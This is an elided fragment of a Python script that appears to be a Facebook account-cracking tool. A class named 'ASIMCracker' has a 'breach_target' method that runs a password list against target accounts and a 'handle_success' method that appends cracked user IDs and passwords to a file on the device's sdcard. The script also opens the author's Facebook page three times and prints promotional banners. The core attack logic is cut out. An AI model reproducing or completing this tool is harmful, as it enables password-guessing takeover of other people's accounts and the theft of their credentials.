...
print('\x1b[1;91m[\x1b[1;97m-\x1b[1;91m] \x1b[1;92m WELCOME Jone my Facebook . . . .')
os.system('xdg-open https://www.facebook.com/RANA.BAHADUR.143')
os.system('xdg-open https://www.facebook.com/RANA.BAHADUR.143')
os.system('xdg-open https://www.facebook.com/RANA.BAHADUR.143')
time.sleep(2)
...
\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mASIM BALOCH \x1b[1;91m(\x1b[1;90mPremium Access\x1b[1;91m)
...
class ASIMCracker:
    ...
    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.W}[RANA KHAN] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()
    ...
    def handle_success(self, uid, password, response):
        ...
        with open('/sdcard/RANA.KHAN-OLD.txt', 'a') as f:
